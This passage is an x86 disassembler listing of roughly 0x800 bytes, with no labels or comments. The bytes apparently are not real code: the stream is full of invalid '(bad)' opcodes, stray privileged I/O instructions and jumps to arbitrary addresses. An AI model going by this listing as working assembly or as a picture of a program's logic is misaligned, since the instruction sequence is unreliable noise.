  420f4b:	sbb    DWORD PTR [edx],esp
  420f4d:	dec    ecx
  420f4e:	test   eax,0x88d3322e
  420f53:	addr16 jbe 0x420f77
  420f56:	addps  xmm6,XMMWORD PTR [esi+0x5c]
  420f5a:	xchg   edi,eax
  420f5b:	push   es
  420f5c:	les    esp,FWORD PTR [edi-0x548662c1]
  420f62:	imul   ecx,edi,0x4b
  420f65:	mov    ch,0x78
  420f67:	loope  0x420fb1
  420f69:	and    al,0x28
  420f6b:	aaa    
  420f6c:	dec    esp
  420f6d:	sub    dl,dl
  420f6f:	pop    ecx
  420f70:	mov    ebp,0x7e47f51a
  420f75:	push   eax
  420f76:	fcomp  QWORD PTR ds:0xbd444281
  420f7c:	into   
  420f7d:	jbe    0x420fb7
  420f7f:	xor    DWORD PTR [eax],ecx
  420f81:	in     eax,0xfe
  420f83:	xchg   edx,ebx
  420f85:	dec    ebx
  420f86:	es icebp 
  420f88:	or     al,0xa1
  420f8a:	adc    ecx,DWORD PTR [edx-0xee9cf21]
  420f90:	inc    eax
  420f91:	enter  0xa850,0xb8
  420f95:	sub    BYTE PTR [eax],bh
  420f97:	ret    
  420f98:	fnsave [ecx+0x4b1fe3da]
  420f9e:	retf   0x5d36
  420fa1:	dec    esi
  420fa2:	repnz mov bl,0x69
  420fa5:	or     cl,bl
  420fa7:	xor    al,0x16
  420fa9:	das    
  420faa:	inc    edx
  420fab:	sub    eax,0x170d2c29
  420fb0:	jbe    0x421013
  420fb2:	test   BYTE PTR [eax],dh
  420fb4:	imul   esp,DWORD PTR [esp+edx*2+0x25fca926],0x7e
  420fbc:	mov    ah,0x6d
  420fbe:	jg     0x42102e
  420fc0:	pop    esp
  420fc1:	cmc    
  420fc2:	jno    0x420f6e
  420fc4:	lods   eax,DWORD PTR ds:[esi]
  420fc5:	shl    BYTE PTR [esi-0x2e],1
  420fc8:	mov    esi,0x7eb2c08b
  420fcd:	sub    dl,BYTE PTR [edx-0x3b]
  420fd0:	rcl    BYTE PTR [esp+ecx*2],0x9d
  420fd4:	xor    eax,0x309554b3
  420fd9:	or     bl,BYTE PTR [edi-0x51d07d7a]
  420fdf:	cli    
  420fe0:	cmp    BYTE PTR [eax+0x3aa01008],dl
  420fe6:	daa    
  420fe7:	mov    DWORD PTR [ebx],0x51fad249
  420fed:	iret   
  420fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fef:	fs adc eax,0x7ff630e
  420ff5:	push   ebx
  420ff6:	cli    
  420ff7:	inc    eax
  420ff8:	inc    esi
  420ff9:	mov    bl,0x82
  420ffb:	fiadd  WORD PTR [eax]
  420ffd:	(bad)  
  420ffe:	mov    ebp,0xdfde63f0
  421003:	xor    edi,ecx
  421005:	inc    ebx
  421006:	fdiv   st(2),st
  421008:	repnz in al,0x8
  42100b:	js     0x420fb4
  42100d:	push   0x16b52452
  421012:	out    dx,eax
  421013:	mov    edx,0x1d14874c
  421018:	mov    BYTE PTR [edi-0x3a47a4ff],cl
  42101e:	mov    ds:0xc04325c0,al
  421023:	out    dx,eax
  421024:	and    ebp,esi
  421026:	xor    BYTE PTR [edx-0x72],al
  421029:	icebp  
  42102a:	lock pusha 
  42102c:	and    dl,BYTE PTR [ebx+0x193a0952]
  421032:	gs push ds
  421034:	and    ebx,DWORD PTR [ecx-0x16]
  421037:	das    
  421038:	xor    eax,0x7bbe862e
  42103d:	mov    esi,0x2d136ac8
  421042:	arpl   sp,ax
  421044:	stos   DWORD PTR es:[edi],eax
  421045:	call   FWORD PTR [ebx]
  421047:	pop    esp
  421048:	mov    dh,0xbd
  42104a:	loopne 0x4210af
  42104c:	cmp    BYTE PTR [edi],bh
  42104e:	test   al,0x45
  421050:	jb     0x4210ad
  421052:	(bad)  
  421053:	jns    0x42102a
  421055:	sub    DWORD PTR [esi],edx
  421057:	and    DWORD PTR [edx-0x24cb038],esp
  42105d:	pop    ebx
  42105e:	(bad)  
  42105f:	mov    dl,0xa3
  421061:	jmp    0x7c366f46
  421066:	hlt    
  421067:	inc    edi
  421068:	shr    DWORD PTR [eax+0x453d702],1
  42106e:	add    al,0x97
  421070:	add    DWORD PTR [bx+di-0x69],ebp
  421074:	inc    eax
  421075:	inc    esp
  421076:	stos   BYTE PTR es:[edi],al
  421077:	mov    esp,0xcf329671
  42107c:	std    
  42107d:	(bad)  [edx+eax*4+0x24]
  421081:	scas   eax,DWORD PTR es:[edi]
  421082:	stos   DWORD PTR es:[edi],eax
  421083:	ret    
  421084:	test   eax,0xbba8ab7
  421089:	fisttp QWORD PTR [edx+0x35]
  42108c:	jne    0x42109a
  42108e:	pushf  
  42108f:	lock pop ebp
  421091:	and    eax,0xc8571e1d
  421096:	push   ebp
  421097:	pop    ecx
  421098:	or     esp,DWORD PTR [ecx]
  42109a:	sub    BYTE PTR [edx+esi*8+0x22],cl
  42109e:	and    esp,DWORD PTR [edi+0x58082d47]
  4210a4:	mov    WORD PTR ds:0x753649fe,es
  4210aa:	in     al,dx
  4210ab:	cmp    eax,0xadd5328d
  4210b0:	cli    
  4210b1:	sbb    BYTE PTR [ebx-0x25a2e429],bh
  4210b7:	mov    ds:0xaa52f05d,al
  4210bc:	mov    eax,0xaa216980
  4210c1:	jnp    0x42108a
  4210c3:	cmp    bh,bh
  4210c5:	jns    0x42109a
  4210c7:	jl     0x421053
  4210c9:	pushf  
  4210ca:	cld    
  4210cb:	or     dl,bh
  4210cd:	xor    ch,BYTE PTR [ebx+eax*2-0x6]
  4210d1:	jecxz  0x42111c
  4210d3:	(bad)  
  4210d4:	int3   
  4210d5:	not    dh
  4210d7:	xchg   edi,eax
  4210d8:	add    DWORD PTR [esi],edx
  4210da:	mov    al,0xfb
  4210dc:	pop    ecx
  4210dd:	(bad)  
  4210de:	fsubrp st(1),st
  4210e0:	ret    
  4210e1:	fs sbb eax,0xe352af4a
  4210e7:	lahf   
  4210e8:	xchg   edx,eax
  4210e9:	push   ss
  4210ea:	xor    DWORD PTR [eax],edx
  4210ec:	mov    DWORD PTR [ecx-0x68],ebp
  4210ef:	(bad)  
  4210f0:	stos   DWORD PTR es:[edi],eax
  4210f1:	and    al,0x56
  4210f3:	and    ch,BYTE PTR [edi]
  4210f5:	inc    ebx
  4210f6:	inc    esp
  4210f7:	ins    BYTE PTR es:[edi],dx
  4210f8:	ins    BYTE PTR es:[edi],dx
  4210f9:	or     eax,0xdb0f7ab2
  4210fe:	mov    ebp,0x700bddeb
  421103:	or     al,0xb2
  421105:	in     al,0x1
  421107:	fidiv  DWORD PTR ds:0x67057229
  42110d:	mov    ch,BYTE PTR [eax-0x7960318]
  421113:	jge    0x4210a6
  421115:	repz ficomp DWORD PTR [edi]
  421118:	fs jns 0x421156
  42111b:	push   edi
  42111c:	fst    DWORD PTR [edi+0x4b]
  42111f:	div    ah
  421121:	lahf   
  421122:	pop    ds
  421123:	mov    dh,0x38
  421125:	or     DWORD PTR [edi],0xe73b956a
  42112b:	retf   
  42112c:	inc    ebp
  42112d:	ds dec edx
  42112f:	ret    0x8b9
  421132:	push   0xba0165ad
  421137:	xchg   esp,eax
  421138:	lods   al,BYTE PTR ds:[esi]
  421139:	out    0x60,eax
  42113b:	and    DWORD PTR [ecx+0xb40821e],0x644ed44c
  421145:	cdq    
  421146:	mov    bl,0xe5
  421148:	dec    eax
  421149:	retf   
  42114a:	xor    BYTE PTR [edi+0x0],ch
  42114d:	outs   dx,DWORD PTR ds:[esi]
  42114e:	dec    eax
  42114f:	lods   eax,DWORD PTR ds:[esi]
  421150:	enter  0xf0f1,0x1c
  421154:	scas   al,BYTE PTR es:[edi]
  421155:	frstor [edx+0x15]
  421158:	jecxz  0x421148
  42115a:	fnstsw WORD PTR ds:0x7b323521
  421160:	jbe    0x4211cd
  421162:	js     0x4210f8
  421164:	add    BYTE PTR [edi],cl
  421166:	jns    0x42115c
  421168:	sbb    DWORD PTR [ecx-0xa],esi
  42116b:	rol    BYTE PTR [eax],0xae
  42116e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42116f:	cmp    eax,0xb3480634
  421174:	sub    al,BYTE PTR [esi]
  421176:	sub    ecx,edi
  421178:	sub    eax,0x5f63f6c9
  42117d:	add    BYTE PTR [eax],al
  42117f:	add    BYTE PTR [eax],al
  421181:	add    BYTE PTR [edi+0x5b2a13cf],al
  421187:	(bad)  
  421188:	mov    edi,0x5549c1ef
  42118d:	cmp    dh,dh
  42118f:	call   0x1:0x8b98a951
  421196:	repz add al,0x0
  421199:	add    BYTE PTR [edi+0x24fcb930],bl
  42119f:	adc    eax,0x7a0f5519
  4211a4:	loope  0x4211cc
  4211a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a7:	mov    DWORD PTR [edx+edx*2-0x1a227b3f],edi
  4211ae:	push   es
  4211af:	sahf   
  4211b0:	int3   
  4211b1:	sbb    al,0xb5
  4211b3:	pop    eax
  4211b4:	sbb    BYTE PTR [ebx-0x6c],0x2c
  4211b8:	call   0xeb18:0x612fb78d
  4211bf:	(bad)  
  4211c1:	les    edi,FWORD PTR [edi-0x26]
  4211c4:	sar    DWORD PTR [edi],1
  4211c6:	shl    BYTE PTR [edi+0x183b7aae],1
  4211cc:	popf   
  4211cd:	in     eax,dx
  4211ce:	push   0xc60dd320
  4211d3:	js     0x42120e
  4211d5:	jp     0x421223
  4211d7:	cmp    al,0xdf
  4211d9:	and    eax,0x7a5ecc57
  4211de:	jno    0x421218
  4211e0:	popa   
  4211e1:	inc    edx
  4211e2:	jmp    0x421244
  4211e4:	xchg   edi,eax
  4211e5:	cmc    
  4211e6:	dec    edx
  4211e7:	xor    DWORD PTR [ebx-0x45],edx
  4211ea:	adc    cl,ch
  4211ec:	adc    dh,BYTE PTR [ebx+0x19]
  4211ef:	mov    ds:0xb5e729e1,al
  4211f4:	fcomp  DWORD PTR [eax+0x10]
  4211f7:	daa    
  4211f8:	cmp    eax,0x2d1ecc79
  4211fd:	cwde   
  4211fe:	jp     0x4211eb
  421200:	mov    ch,0x1d
  421202:	mov    al,ds:0x8522dcd9
  421207:	lods   al,BYTE PTR ds:[esi]
  421208:	push   es
  421209:	push   ds
  42120a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42120b:	add    cl,cl
  42120d:	dec    esi
  42120e:	aas    
  42120f:	fwait
  421210:	sub    al,0xde
  421212:	xor    BYTE PTR [ecx+ebx*2+0x6ed75025],bl
  421219:	xchg   edx,eax
  42121a:	stc    
  42121b:	sub    DWORD PTR [eax+eiz*4-0x78],ebp
  42121f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421220:	outs   dx,DWORD PTR ds:[esi]
  421221:	inc    edx
  421222:	push   0x2bd0645b
  421227:	jle    0x4211dd
  421229:	std    
  42122a:	mov    WORD PTR [ebx-0x36],?
  42122d:	sti    
  42122e:	ret    
  42122f:	xor    al,0x6a
  421231:	mov    DWORD PTR [edx],ebx
  421233:	push   edx
  421234:	mov    dl,0x1e
  421236:	sbb    al,0x79
  421238:	pop    ebx
  421239:	push   ds
  42123a:	or     DWORD PTR [edx-0x52],ebx
  42123d:	repz das 
  42123f:	out    dx,eax
  421240:	or     DWORD PTR fs:[edi],0x6b0d1364
  421247:	pop    esp
  421248:	inc    eax
  421249:	push   ebp
  42124a:	ss jmp 0xb312c703
  421250:	sub    ebp,DWORD PTR [esi-0x421d11d5]
  421256:	or     edi,DWORD PTR [esi+0x12442fba]
  42125c:	dec    esp
  42125d:	call   0x959c:0x1898cb4c
  421264:	(bad)  
  421265:	sub    edi,DWORD PTR [ebp+0x3379c5d9]
  42126b:	xchg   edx,eax
  42126c:	inc    eax
  42126d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42126e:	pop    esp
  42126f:	iret   
  421270:	adc    DWORD PTR [ecx+ebx*1],edx
  421273:	cmp    al,0x96
  421275:	pushf  
  421276:	bound  edi,QWORD PTR [ecx+0x30f41439]
  42127c:	mov    cl,0x9d
  42127e:	xchg   esp,eax
  42127f:	shl    DWORD PTR [ebx-0x4e3c269a],1
  421285:	popa   
  421286:	pop    edx
  421287:	and    eax,0x577797aa
  42128c:	dec    ebp
  42128d:	jnp    0x421216
  42128f:	shr    BYTE PTR [ecx-0x760b37bc],cl
  421295:	test   al,0x29
  421297:	ins    DWORD PTR es:[edi],dx
  421298:	jae    0x4212c5
  42129a:	push   ecx
  42129b:	outs   dx,DWORD PTR ds:[esi]
  42129c:	stos   DWORD PTR es:[edi],eax
  42129d:	mov    al,ds:0x69d8bac5
  4212a2:	pop    ss
  4212a3:	dec    esp
  4212a4:	adc    edi,DWORD PTR [edx+ecx*2+0x3d]
  4212a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a9:	test   DWORD PTR [ecx+0x5],ecx
  4212ac:	jae    0x4212d1
  4212ae:	pop    es
  4212af:	add    DWORD PTR [ecx-0x33e7d8b8],0x9f305428
  4212b9:	ja     0x4212de
  4212bb:	mov    WORD PTR [ebx+0xb7fef7f],?
  4212c1:	dec    ebp
  4212c2:	cld    
  4212c3:	hlt    
  4212c4:	fwait
  4212c5:	or     eax,0xc097468f
  4212ca:	daa    
  4212cb:	loope  0x421279
  4212cd:	sub    dl,BYTE PTR [edx-0x5320c989]
  4212d3:	lds    edi,FWORD PTR [ebp+0x116ca806]
  4212d9:	call   0xbedfb9c
  4212de:	jae    0x421308
  4212e0:	mov    cl,0x81
  4212e2:	mov    edi,0x2b1f37fa
  4212e7:	push   ss
  4212e8:	test   DWORD PTR [ecx],edi
  4212ea:	jmp    0x98e3fff
  4212ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212f0:	in     eax,dx
  4212f1:	xor    ecx,DWORD PTR [eax+0x3a]
  4212f4:	out    dx,al
  4212f5:	and    bh,al
  4212f7:	ins    BYTE PTR es:[edi],dx
  4212f8:	leave  
  4212f9:	sub    eax,0xa479cdee
  4212fe:	pop    ss
  4212ff:	dec    edx
  421300:	mov    bl,0x88
  421302:	jecxz  0x4212af
  421304:	jl     0x4212cc
  421306:	jle    0x421377
  421308:	shl    BYTE PTR [esi-0x4c],0x18
  42130c:	and    al,bh
  42130e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42130f:	scas   al,BYTE PTR es:[edi]
  421310:	mov    ebx,0x1369021e
  421315:	mov    dl,0x34
  421317:	and    esp,edx
  421319:	scas   al,BYTE PTR es:[edi]
  42131a:	or     DWORD PTR [edi+0x1ba4d773],edi
  421320:	(bad)  
  421321:	call   0x65ac:0xa368ec6
  421328:	loop   0x4212bf
  42132a:	ss xchg ebp,eax
  42132c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42132d:	es daa 
  42132f:	add    al,BYTE PTR ds:0x5e318256
  421335:	fisttp QWORD PTR [ebp-0x63]
  421338:	ss ret 
  42133a:	dec    esi
  42133b:	hlt    
  42133c:	lds    esi,FWORD PTR [ecx-0x28b86a56]
  421342:	cdq    
  421343:	test   BYTE PTR [eax-0x7d9c3b77],cl
  421349:	arpl   WORD PTR [esi],si
  42134b:	fsubr  DWORD PTR [esi-0x3887b836]
  421351:	push   es
  421352:	sbb    eax,DWORD PTR [ebp-0x13dd077f]
  421358:	cmp    DWORD PTR [ebx+0x6d],ebx
  42135b:	aad    0xf0
  42135d:	in     al,0xc4
  42135f:	xchg   BYTE PTR [esi+0x29e488ec],dh
  421365:	ss jp  0x42138f
  421368:	mov    bh,0xeb
  42136a:	and    bl,bh
  42136c:	pushf  
  42136d:	inc    edx
  42136e:	xor    ah,bl
  421370:	ins    BYTE PTR es:[edi],dx
  421371:	into   
  421372:	out    dx,eax
  421373:	fdiv   QWORD PTR [esi+edx*8]
  421376:	(bad)  
  421377:	imul   esi,ecx,0x4d
  42137a:	xchg   esp,eax
  42137b:	and    edx,esp
  42137d:	dec    ebx
  42137e:	jno    0x4213f6
  421380:	xchg   esi,eax
  421381:	pop    ss
  421382:	and    al,0x88
  421384:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421386:	push   0xffffffe4
  421388:	inc    esp
  421389:	add    cl,bh
  42138b:	ficomp DWORD PTR [ecx+eiz*2+0x57b597ad]
  421392:	lahf   
  421393:	sub    DWORD PTR [ebx+eiz*4+0x1f],edx
  421397:	sbb    DWORD PTR [edx],edi
  421399:	mov    WORD PTR [ebp+0x28],fs
  42139c:	and    DWORD PTR [ebx+0x5b98c885],esp
  4213a2:	jbe    0x421418
  4213a4:	in     al,0x8d
  4213a6:	nop
  4213a7:	or     eax,0x3b77e240
  4213ac:	dec    ebp
  4213ad:	adc    eax,0x27ddf341
  4213b2:	and    edi,ecx
  4213b4:	dec    esi
  4213b5:	cmp    eax,0xb7023056
  4213ba:	ja     0x421378
  4213bc:	add    cl,al
  4213be:	xchg   BYTE PTR [esi],cl
  4213c0:	gs aas 
  4213c2:	(bad)  
  4213c3:	jmp    FWORD PTR [edi]
  4213c5:	fild   WORD PTR [edx-0x72539faf]
  4213cb:	xor    al,0xe4
  4213cd:	rcr    BYTE PTR [ecx],cl
  4213cf:	sbb    eax,0x7503ad7a
  4213d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d5:	jl     0x4213f7
  4213d7:	push   ecx
  4213d8:	outs   dx,BYTE PTR ds:[esi]
  4213d9:	or     cl,ah
  4213db:	popa   
  4213dc:	xor    eax,0xe04c1a50
  4213e1:	and    BYTE PTR [esi+0x67cfa440],cl
  4213e7:	scas   al,BYTE PTR es:[edi]
  4213e8:	ja     0x4213f4
  4213ea:	call   0x705b897a
  4213ef:	fsubrp st(6),st
  4213f1:	mov    dh,0xc6
  4213f3:	icebp  
  4213f4:	mov    ah,0x9d
  4213f6:	aad    0x51
  4213f8:	mov    DWORD PTR [ecx],eax
  4213fa:	stos   BYTE PTR es:[edi],al
  4213fb:	xor    al,BYTE PTR [ebp+0x3ed557d2]
  421401:	sbb    BYTE PTR [ecx+0x4e22940a],bh
  421407:	out    dx,eax
  421408:	imul   eax,DWORD PTR [edi-0x7970c48a],0xfffffffd
  42140f:	xor    edi,DWORD PTR [edx+0x2c57eed1]
  421415:	mov    ds:0x60d57f07,al
  42141a:	add    DWORD PTR [eax-0x35b241f4],eax
  421420:	rol    BYTE PTR [eax-0x1c],cl
  421423:	mov    eax,DWORD PTR [ebp+0x53]
  421426:	adc    al,BYTE PTR [ebp+0x53]
  421429:	pop    ds
  42142a:	sub    DWORD PTR [edi+eax*2+0x296e8ce6],0x1b
  421432:	cmp    BYTE PTR [ebx],ch
  421434:	in     al,0xcf
  421436:	nop
  421437:	adc    DWORD PTR [eax],ebp
  421439:	loope  0x4213ea
  42143b:	call   0x390a:0xcc384983
  421442:	xchg   esi,eax
  421443:	sub    DWORD PTR [edi],edx
  421445:	nop
  421446:	xor    eax,0xf8059fcb
  42144b:	xor    dl,0x37
  42144e:	mov    dh,0x89
  421450:	(bad)  
  421451:	push   esi
  421452:	inc    ebx
  421453:	int3   
  421454:	cli    
  421455:	out    0xd7,al
  421457:	push   eax
  421458:	daa    
  421459:	pop    esp
  42145a:	push   es
  42145b:	(bad)  
  42145c:	fsubr  DWORD PTR [ebx+0x5e]
  42145f:	in     eax,dx
  421460:	iret   
  421461:	sub    ebp,edi
  421463:	lods   al,BYTE PTR ds:[esi]
  421464:	pushf  
  421465:	or     esp,DWORD PTR [edi]
  421467:	adc    BYTE PTR [edi-0x21],ah
  42146a:	sar    BYTE PTR [edx],cl
  42146c:	jle    0x421487
  42146e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42146f:	ins    DWORD PTR es:[edi],dx
  421470:	push   ds
  421471:	aad    0x1
  421473:	fs sahf 
  421475:	leave  
  421476:	jae    0x4214f4
  421478:	pop    ecx
  421479:	adc    dl,ch
  42147b:	lds    esi,FWORD PTR [ecx+0xf62adb2]
  421481:	test   al,0x12
  421483:	cmp    ebp,DWORD PTR [ebp-0x46106198]
  421489:	mov    bl,0x4e
  42148b:	push   eax
  42148c:	push   ds
  42148d:	and    al,0x5a
  42148f:	mov    eax,0xd52ca2ab
  421494:	mov    esi,0x340ec419
  421499:	pusha  
  42149a:	gs cmp eax,0xcf7ae5fa
  4214a0:	sub    al,bh
  4214a2:	pop    edx
  4214a3:	test   eax,0x6202ded5
  4214a8:	das    
  4214a9:	int3   
  4214aa:	push   cs
  4214ab:	adc    esp,DWORD PTR [ebp+0x4edeed28]
  4214b1:	loope  0x4214bb
  4214b3:	push   0x16d99408
  4214b8:	jg     0x4214c3
  4214ba:	fisubr DWORD PTR [eax+0x82cab8]
  4214c0:	xor    edx,DWORD PTR [ecx*2-0xfc5c01]
  4214c7:	shl    BYTE PTR [ebp-0xe],cl
  4214ca:	int3   
  4214cb:	shr    BYTE PTR [ebx],0xd0
  4214ce:	xor    esp,DWORD PTR [ecx-0x7c]
  4214d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214d2:	nop
  4214d3:	sbb    al,0x3f
  4214d5:	jle    0x421556
  4214d7:	fbstp  TBYTE PTR [ebx+0x8384b72]
  4214dd:	push   ecx
  4214de:	std    
  4214df:	repz inc edi
  4214e1:	cmp    BYTE PTR [ecx],al
  4214e3:	xor    BYTE PTR [ebp+ebx*2+0x9],0x5
  4214e8:	cdq    
  4214e9:	addr16 call 0xbb7b9c3c
  4214ef:	adc    bl,dh
  4214f1:	mov    ch,0x22
  4214f3:	mov    dl,0xc3
  4214f5:	mov    cl,0x32
  4214f7:	sahf   
  4214f8:	gs lock mov al,0x11
  4214fc:	das    
  4214fd:	xor    ecx,esi
  4214ff:	scas   al,BYTE PTR es:[edi]
  421500:	mov    esi,DWORD PTR [edx+0x527f5634]
  421506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421507:	test   al,0x8
  421509:	sub    DWORD PTR [esi-0x58af388d],esi
  42150f:	xor    bh,BYTE PTR [ecx+eax*4+0x75e3927c]
  421516:	pop    edx
  421517:	sbb    al,0x15
  421519:	cmp    dh,BYTE PTR [edi]
  42151b:	cmp    al,0x31
  42151d:	sub    ebx,DWORD PTR [eax+0x240f4fd3]
  421523:	loop   0x421529
  421525:	jge    0x4214be
  421527:	stos   DWORD PTR es:[edi],eax
  421528:	jp     0x421562
  42152a:	imul   edi,DWORD PTR [ecx],0xaa30c7f2
  421530:	xor    al,0xc9
  421532:	cmc    
  421533:	xlat   BYTE PTR ds:[ebx]
  421534:	jno    0x42159e
  421536:	push   cs
  421537:	and    eax,0x2ef5d556
  42153c:	imul   esi,DWORD PTR [edi],0xffffffa8
  42153f:	dec    ebx
  421540:	pop    ecx
  421541:	enter  0xfc0f,0xfb
  421545:	xlat   BYTE PTR ds:[ebx]
  421546:	popf   
  421547:	call   0x559dd71d
  42154c:	ret    
  42154d:	adc    cl,bl
  42154f:	mov    esi,0x6ec01231
  421554:	cmp    al,0xba
  421556:	push   es
  421557:	add    bh,BYTE PTR [eax+0x39f2d641]
  42155d:	neg    ch
  42155f:	jne    0x421510
  421561:	ret    
  421562:	pop    eax
  421563:	shr    BYTE PTR [esi+0x10],0x58
  421567:	and    al,0xda
  421569:	repnz out 0x4d,al
  42156c:	pop    ds
  42156d:	stos   BYTE PTR es:[edi],al
  42156e:	in     al,dx
  42156f:	xor    ebx,esi
  421571:	repz pop ds
  421573:	fiadd  DWORD PTR [ecx+0x7d]
  421576:	cmp    DWORD PTR [edx],ecx
  421578:	cmp    eax,0x5444e404
  42157d:	pushf  
  42157e:	loopne 0x4215d5
  421580:	xchg   ebp,eax
  421581:	aam    0x35
  421583:	icebp  
  421584:	pop    ebx
  421585:	lahf   
  421586:	sbb    ch,BYTE PTR [ecx+0x56]
  421589:	pop    ss
  42158a:	out    0x2e,al
  42158c:	and    al,0xa
  42158e:	out    dx,al
  42158f:	inc    esp
  421590:	mov    ch,0x97
  421592:	push   esi
  421593:	leave  
  421594:	fimul  WORD PTR [ebp+0x79]
  421597:	stc    
  421598:	mov    ss,WORD PTR [eax-0x74acbc43]
  42159e:	jecxz  0x42153b
  4215a0:	daa    
  4215a1:	cmp    BYTE PTR [edx-0x42],cl
  4215a4:	adc    al,0x24
  4215a6:	jmp    0x6ae2:0x55557af7
  4215ad:	xchg   BYTE PTR [esi-0x18],dh
  4215b0:	adc    DWORD PTR [ebx+edx*8-0x18],edi
  4215b4:	not    DWORD PTR [ecx+0x1c5e8dea]
  4215ba:	push   es
  4215bb:	hlt    
  4215bc:	and    al,0x8
  4215be:	scas   eax,DWORD PTR es:[edi]
  4215bf:	daa    
  4215c0:	scas   eax,DWORD PTR es:[edi]
  4215c1:	stos   DWORD PTR es:[edi],eax
  4215c2:	mov    dl,0x58
  4215c4:	lds    edx,FWORD PTR [ebx]
  4215c6:	sub    BYTE PTR fs:[eax],0xfb
  4215ca:	daa    
  4215cb:	or     DWORD PTR [ebx+0x78a41897],ecx
  4215d1:	cmp    edx,DWORD PTR [esi-0x7c06afdc]
  4215d7:	lods   al,BYTE PTR ds:[esi]
  4215d8:	sbb    eax,DWORD PTR [ecx+0x48]
  4215db:	sar    BYTE PTR [edx-0x1cb35d27],1
  4215e1:	mov    cl,0xc3
  4215e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215e4:	(bad)  
  4215e5:	out    0x1d,al
  4215e7:	ss adc al,0x65
  4215ea:	cmp    DWORD PTR [edx+0x5a2ea605],0x38
  4215f1:	shl    BYTE PTR [edx+0x5e],0x43
  4215f5:	xchg   BYTE PTR [eax+0x62e6f03c],ch
  4215fb:	jbe    0x421602
  4215fd:	daa    
  4215fe:	(bad)  
  4215ff:	into   
  421600:	sub    al,0x64
  421602:	add    ah,BYTE PTR [eax+eax*8]
  421605:	inc    edi
  421606:	mov    esi,0x997c4caf
  42160b:	adc    BYTE PTR [esi-0x6d27359d],dl
  421611:	or     BYTE PTR [esi-0x14e8a78c],0x2f
  421618:	and    al,0x2f
  42161a:	sub    bl,ah
  42161c:	test   BYTE PTR [ebx+0x7d],dl
  42161f:	push   edx
  421620:	pop    ecx
  421621:	push   esi
  421622:	test   esi,edi
  421624:	enter  0xa6cc,0xd2
  421628:	gs loop 0x421605
  42162b:	and    DWORD PTR [ebp-0x47a4730d],esp
  421631:	fs inc esi
  421633:	in     ax,0xe5
  421636:	es je  0x42165e
  421639:	or     BYTE PTR [edi+0x73],dl
  42163c:	(bad)  
  42163d:	cld    
  42163e:	dec    edi
  42163f:	push   ds
  421640:	or     ah,al
  421642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421643:	(bad)  
  421644:	mov    dl,0x4c
  421646:	loop   0x4216a9
  421648:	push   eax
  421649:	jne    0x421690
  42164b:	cli    
  42164c:	pushf  
  42164d:	mov    dl,0x79
  42164f:	retf   0x6227
  421652:	jl     0x4216ab
  421654:	test   DWORD PTR ss:[esi+eiz*1+0x51dc2459],ebx
  42165c:	sub    DWORD PTR [esi-0x75],edx
  42165f:	clc    
  421660:	pop    edx
  421661:	sub    BYTE PTR [eax+0x7f],0x79
  421665:	xlat   BYTE PTR ds:[ebx]
  421666:	test   esi,edi
  421668:	cwde   
  421669:	es and ch,al
  42166c:	and    BYTE PTR [ecx+0x11d739db],bl
  421672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421673:	adc    eax,0x45a7a307
  421678:	ffreep st(2)
  42167a:	sbb    eax,0x203614c
  42167f:	add    BYTE PTR [ecx],ah
  421681:	fstp   TBYTE PTR [esi-0x5b]
  421684:	test   BYTE PTR [esp+edx*8+0x6bf15530],0xd1
  42168c:	jge    0x42168e
  42168e:	add    BYTE PTR [eax],al
  421690:	add    BYTE PTR [eax],al
  421692:	sti    
  421693:	and    al,0xdc
  421695:	es (bad) 
  421698:	sti    
  421699:	std    
  42169a:	sbb    ch,BYTE PTR [edx]
  42169c:	adc    eax,0x448e8bc6
  4216a1:	dec    BYTE PTR [ebx-0xcfffe70]
  4216a7:	add    al,0x0
  4216a9:	add    BYTE PTR [ebp+0x1d265f61],dh
  4216af:	loopne 0x421663
  4216b1:	gs pusha 
  4216b3:	sub    BYTE PTR [ecx+eiz*8],0x96
  4216b7:	cmc    
  4216b8:	(bad)
  4216bb:	add    eax,0x1f18ec28
  4216c0:	sar    DWORD PTR ds:0x3deb2094,cl
  4216c6:	inc    al
  4216c8:	ror    bh,1
  4216ca:	hlt    
  4216cb:	sub    bl,bh
  4216cd:	and    ah,BYTE PTR [ebp-0x71]
  4216d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216d1:	pop    eax
  4216d2:	cli    
  4216d3:	ret    0xeb09
  4216d6:	test   eax,0x5afaa0c6
  4216db:	pop    es
  4216dc:	sti    
  4216dd:	mov    ch,0xd3
  4216df:	fcmovne st,st(4)
  4216e1:	ss (bad) 
  4216e4:	es ds cs dec edi
  4216e8:	in     eax,dx
  4216e9:	adc    ebp,DWORD PTR [ebp+0x30425bf5]
  4216ef:	pusha  
  4216f0:	ret    
  4216f1:	mov    DWORD PTR [eax+0x1f],ebp
  4216f4:	sbb    al,0xe9
  4216f6:	leave  
  4216f7:	mov    DWORD PTR [eax-0x29],ebp
  4216fa:	xor    DWORD PTR [ebx],ebp
  4216fc:	pushf  
  4216fd:	jae    0x421699
  4216ff:	(bad)  
  421700:	pushf  
  421701:	mov    al,ds:0x8960fa03
  421706:	jno    0x421769
  421708:	push   ecx
  421709:	outs   dx,BYTE PTR ds:[esi]
  42170a:	outs   dx,DWORD PTR ds:[esi]
  42170b:	imul   esi
  42170d:	inc    edx
  42170e:	inc    eax
  42170f:	push   edi
  421710:	xchg   BYTE PTR [ecx-0x7b],ah
  421713:	nop
  421714:	mov    BYTE PTR [edi+ebp*8+0x68],dh
